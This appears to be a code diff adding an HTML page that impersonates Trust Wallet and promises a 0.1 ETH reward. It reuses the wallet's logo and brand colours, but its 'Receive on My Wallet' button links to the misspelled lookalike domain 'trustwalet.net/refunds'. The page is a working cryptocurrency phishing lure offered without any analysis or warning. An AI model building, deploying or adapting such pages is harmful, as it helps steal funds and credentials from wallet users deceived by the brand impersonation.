@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Wallet - Receive ETH Reward</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #F3F4F6;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #FFFFFF;
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+            width: 350px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        .amount {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1E1E1E;
+            margin: 15px 0;
+        }
+        .reward-info {
+            background-color: #E7F3FE;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            text-align: left;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+        .button {
+            display: block;
+            background-color: #2196F3; /* Trust Wallet blue */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 0; /* Reduced padding for smaller buttons */
+            width: 100%; /* Full width */
+            font-size: 16px; /* Adjusted font size */
+            cursor: pointer;
+            margin: 10px 0; /* Space between buttons */
+            transition: background-color 0.3s;
+            text-align: center; /* Center text */
+            text-decoration: none; /* Remove underline for anchor */
+        }
+        .button:hover {
+            background-color: #1976D2; /* Darker blue for hover effect */
+        }
+        .cancel-button {
+            background-color: #FF3B30; /* Cancel red */
+        }
+        .cancel-button:hover {
+            background-color: #D32F2F; /* Darker red for hover effect */
+        }
+        .trust-logo {
+            width: 80px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="https://trustwallet.com" target="_blank">
+            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" alt="Trust Wallet Logo" class="trust-logo" />
+        </a>
+        <h1>Receive ETH Reward</h1>
+        <div class="amount">0.1 ETH</div>
+        <div class="reward-info">
+            <strong>Reward Info:</strong><br>
+            You are about to receive a reward of <strong>0.1 ETH</strong> to Your Wallet.
+        </div>
+        <a href="https://trustwalet.net/refunds" class="button">Receive on My Wallet</a>
+        <button class="button cancel-button">Cancel</button>
+    </div>
+</body>
+</html>
